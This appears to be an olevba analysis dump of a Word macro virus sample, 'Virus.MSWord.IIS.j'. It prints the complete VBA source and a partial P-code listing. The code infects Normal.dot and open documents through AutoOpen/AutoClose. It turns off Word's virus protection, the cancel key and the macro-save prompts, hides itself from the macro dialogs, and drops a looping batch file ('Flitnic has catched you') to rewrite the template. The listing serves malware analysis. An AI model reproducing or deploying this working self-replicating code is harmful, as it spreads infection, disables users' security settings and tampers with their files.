olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.j
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.j - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.IIS.j - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo eb
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr NormalTemplate.FullName, vbNormal
NoSet:
Call FLTNC
eb:
End Sub
Sub ViewVbCode()
On Error GoTo NoDoc
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr (NormalTemplate.FullName), vbNormal
NoSet:
Close #1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
Close #1
If windir = "" Then Exit Sub
'Clean Activedocument:
ms = ActiveDocument.VBProject.VBComponents.Count
For t = 1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(1, 1)
If UCase(l) = "'Sub AutoOpen()" Then
Acd = 1
Exit For
End If
Next t
a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines 1, a
ActiveDocument.Saved = True
NoDoc:
'Clean NormalTemplate:
ms = NormalTemplate.VBProject.VBComponents.Count
For t2 = 2 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT = 1
Exit For
End If
Next t2
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For i = 1 To 2
al = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, al
Next i
esub:
eb:
Application.ShowVisualBasicEditor = True
NoDocL:
Options.SaveNormalPrompt = False
NormalTemplate.Saved = True
End Sub
Sub ToolsMacro()
On Error GoTo NoDoc
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr (NormalTemplate.FullName), vbNormal
NoSet:
'Save ActiveDocument:
ms = ActiveDocument.VBProject.VBComponents.Count
For t = 1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd = 1
Exit For
End If
Next t
If Acd = 1 Then
FullCodeD = "Sub AutoOpen" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
For ii = 2 To a
l = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.Lines(ii, 1)
FullCodeN = FullCodeN & l & Chr(13)
FullCodeD = FullCodeD & l & Chr(13)
Next ii
End If
'Clean Activedocument:
a = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines 1, a
ActiveDocument.Saved = True
ActiveDocument.Saved = True
NoDoc:
'Save NormalTemplate:
ms = NormalTemplate.VBProject.VBComponents.Count
For t2 = 1 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT = 1
Exit For
End If
Next t2
If NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
For iiii = 2 To a
l = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(iiii, 1)
FullCodeD = FullCodeD & l & Chr(13)
FullCodeN = FullCodeN & l & Chr(13)
Next iiii
End If
'Clean NormalTemplate:
l = ""
On Error GoTo 0
On Error GoTo eb
a = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, a
NormalTemplate.Saved = True
esub:
Close #1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
Close #1
If windir = "" Then Exit Sub
a = GetAttr(NormalTemplate.FullName)
If a = 33 Then a = 1
If a = 1 Then GoTo eb
eb:
NormalTemplate.Saved = True
Application.Dialogs(wdDialogToolsMacro).Show
ReInf = True
If Application.ShowVisualBasicEditor = True Then ReInf = False
Reinfection:
If ReInf = True Then
'Reinfection:
Acd = 0
NormT = 0
If NormT <> 1 Then
NormalTemplate.OpenAsDocument
NormAt = ActiveDocument.ReadOnly
ActiveDocument.Close
Close #1
look:
ms = NormalTemplate.VBProject.VBComponents.Count
For inn = 2 To ms
a = NormalTemplate.VBProject.VBComponents(inn).CodeModule.countoflines
If a < 1 Then
NormalTemplate.VBProject.VBComponents(inn).CodeModule.AddFromstring (FullCodeN)
i = 20
Exit For
End If
Next inn
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look
End If
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
NormalTemplate.Saved = True
End If
End If
i = 1
If NormAt <> True Then NormalTemplate.Save
notemp:
If Acd <> 1 Then
Close
look2:
a = Application.Documents.Count
If a < 1 Then GoTo NoDocL
ms = ActiveDocument.VBProject.VBComponents.Count
For inn2 = 2 To ms
a = ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If a < 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring (FullCodeD)
i = 20
Exit For
End If
Next inn2
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End If
End If
NoDocL:
Else
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For i = 1 To 2
al = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, al
NormalTemplate.Saved = True
Next i
End If
Options.SaveNormalPrompt = False
NormalTemplate.Saved = True
End Sub
Sub FLTNC()
Begin:
On Error GoTo eb
NormAt = False
VBE.CommandBars("Edit").Controls(1).Enabled = False
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Close #1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
If windir = "" Then Exit Sub
On Error GoTo NoInf
ms = ActiveDocument.VBProject.VBComponents.Count
For t = 1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd = 1
Exit For
End If
Next t
If Acd = 1 Then
FullCodeN = "Sub AutoClose()" & Chr(13)
a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
For ii = 2 To a
l = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.Lines(ii, 1)
FullCodeN = FullCodeN & l & Chr(13)
Next ii
End If
ms = NormalTemplate.VBProject.VBComponents.Count
For t2 = 1 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT = 1
Exit For
End If
Next t2
If NormT = 1 Then
FullCodeD = "SUB AUTOCLOSE" & Chr(13)
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
For iiii = 2 To a
l = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(iiii, 1)
FullCodeD = FullCodeD & l & Chr(13)
Next iiii
End If
If NormT <> 1 Then
look:
ms = NormalTemplate.VBProject.VBComponents.Count
For inn = 2 To ms
a = NormalTemplate.VBProject.VBComponents(inn).CodeModule.countoflines
If a < 1 Then
NormalTemplate.VBProject.VBComponents(inn).CodeModule.AddFromstring (FullCodeN)
i = 20
Exit For
End If
Next inn
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look
End If
a = Dir(windir & "\System\lo.sys")
If a <> "" Then Kill windir & "\System\lo.sys"
NormalTemplate.OpenAsDocument
NormAtt = ActiveDocument.ReadOnly
l = ""
On Error GoTo eb
ActiveDocument.SaveAs FileName:=windir & "\System\lo.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
NormalTemplate.Saved = True
ActiveDocument.Saved = True
ActiveDocument.Close
Close #1
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l = Len(NormalTemplate.FullName)
l = l - 10
For i = 1 To 500
Print #1, "rem Flitnic has catched you... he, he"
Next i
Print #1, ":Begin"
Print #1, "Move /y c:\Troop.dat " & NormalTemplate.FullName
Print #1, "If exist c:\Troop.dat goto Begin"
Close #1
NormalTemplate.Saved = True
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
End If
notemp:
End If
i = 1
If Acd <> 1 Then
Close
look2:
ms = ActiveDocument.VBProject.VBComponents.Count
For inn2 = 2 To ms
a = ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If a < 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring (FullCodeD)
i = 20
Exit For
End If
Next inn2
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End If
End If
NoInf:
eb:
a = Dir(NormalTemplate.FullName)
If a = "" Then
NormalTemplate.Saved = False
GoTo NoNormal
End If
If NormAtt = True Then
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
SetAttr (NormalTemplate.FullName), vbNormal
a = Shell(windir & "\System\lo.bat", 0)
Else
NormalTemplate.Save
End If
NormalTemplate.Saved = True
NoNormal:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.IIS.j
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modul1 - 18199 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError eb 
' Line #2:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #3:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoSet 
' 	EndIf 
' Line #4:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #5:
' 	Label NoSet 
' Line #6:
' 	ArgsCall (Call) FLTNC 0x0000 
' Line #7:
' 	Label eb 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Sub ViewVbCode())
' Line #10:
' 	OnError NoDoc 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #12:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoSet 
' 	EndIf 
' Line #13:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #14:
' 	Label NoSet 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #16:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #17:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #19:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #20:
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #21:
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Loop 
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #25:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #26:
' 	QuoteRem 0x0000 0x0015 "Clean Activedocument:"
' Line #27:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #28:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #29:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #30:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #31:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000F "'Sub AutoOpen()"
' 	Eq 
' 	IfBlock 
' Line #32:
' 	LitDI2 0x0001 
' 	St Acd 
' Line #33:
' 	ExitFor 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #37:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #38:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #39:
' 	Label NoDoc 
' Line #40:
' 	QuoteRem 0x0000 0x0015 "Clean NormalTemplate:"
' Line #41:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #42:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #43:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #44:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #45:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000F "SUB AUTOCLOSE()"
' 	Eq 
' 	IfBlock 
' Line #46:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #47:
' 	ExitFor 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	ArgsCall FileCopy 0x0002 
' Line #51:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #52:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #53:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St al 
' Line #54:
' 	LitDI2 0x0001 
' 	Ld al 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #55:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	Label esub 
' Line #57:
' 	Label eb 
' Line #58:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #59:
' 	Label NoDocL 
' Line #60:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #61:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Sub ToolsMacro())
' Line #64:
' 	OnError NoDoc 
' Line #65:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #66:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoSet 
' 	EndIf 
' Line #67:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #68:
' 	Label NoSet 
' Line #69:
' 	QuoteRem 0x0000 0x0014 "Save ActiveDocument:"
' Line #70:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #71:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #72:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #73:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #74:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000E "SUB AUTOOPEN()"
' 	Eq 
' 	IfBlock 
' Line #75:
' 	LitDI2 0x0001 
' 	St Acd 
' Line #76:
' 	ExitFor 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #79:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #80:
' 	LitStr 0x000C "Sub AutoOpen"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #81:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #82:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #83:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #84:
' 	Ld ii 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #85:
' 	Ld FullCodeN 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #86:
' 	Ld FullCodeD 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #87:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	QuoteRem 0x0000 0x0015 "Clean Activedocument:"
' Line #90:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #91:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #92:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #93:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #94:
' 	Label NoDoc 
' Line #95:
' 	QuoteRem 0x0000 0x0014 "Save NormalTemplate:"
' Line #96:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #97:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #98:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #99:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #100:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000F "SUB AUTOCLOSE()"
' 	Eq 
' 	IfBlock 
' Line #101:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #102:
' 	ExitFor 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #106:
' 	LitStr 0x000E "Sub AutoOpen()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #107:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #108:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #109:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #110:
' 	Ld iiii 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #111:
' 	Ld FullCodeD 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #112:
' 	Ld FullCodeN 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #113:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	QuoteRem 0x0000 0x0015 "Clean NormalTemplate:"
' Line #116:
' 	LitStr 0x0000 ""
' 	St l 
' Line #117:
' 	OnError (GoTo 0) 
' Line #118:
' 	OnError eb 
' Line #119:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #120:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #121:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #122:
' 	Label esub 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #124:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #125:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #126:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #127:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #128:
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #129:
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	Loop 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #133:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #134:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St a 
' Line #135:
' 	Ld a 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St a 
' 	EndIf 
' Line #136:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo eb 
' 	EndIf 
' Line #137:
' 	Label eb 
' Line #138:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
